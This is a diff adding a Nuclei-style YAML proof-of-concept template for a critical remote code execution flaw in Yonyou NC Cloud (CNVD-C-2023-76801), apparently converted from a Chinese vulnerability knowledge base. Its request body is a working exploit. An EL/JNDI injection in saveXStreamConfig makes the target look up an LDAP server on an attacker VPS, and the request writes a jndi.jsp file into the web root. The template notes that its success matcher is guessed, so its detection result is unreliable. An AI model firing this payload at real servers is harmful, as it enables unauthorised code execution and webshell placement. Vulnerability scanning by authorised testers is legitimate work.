@@ -1,0 +1,50 @@
+id: poc-kc9gl53cbn7z17gu
+info:
+  name: 用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801 -1
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kc9gl53cbn7z17gu
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kc9gl53cbn7z17gu
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''''.getClass().forName(''javax.naming.InitialContext'').newInstance().lookup(''ldap://VPSip:1389/TomcatBypass/TomcatEcho'')}","webapps/nc_web/jndi.jsp"]}
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /jndi.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
